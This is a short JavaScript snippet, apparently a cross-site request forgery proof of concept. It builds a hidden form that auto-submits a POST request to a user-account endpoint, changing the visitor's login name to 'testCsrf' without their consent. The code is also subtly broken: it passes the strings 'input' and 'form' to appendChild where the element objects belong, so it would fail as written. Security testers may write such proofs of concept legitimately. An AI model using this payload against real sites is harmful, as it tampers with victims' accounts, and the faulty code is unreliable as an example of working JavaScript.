(function () {
  var body = document.querySelector('body');
  var form = document.createElement('form');
  form.method = 'post';
  form.action = '/governor-api/governor/user/pub-user/update-login-name';
  var input = document.createElement('input');
  input.name = 'loginName';
  input.value = 'testCsrf';
  form.appendChild('input');
  body.appendChild('form');
  form.submit();
  form.remove();
})();
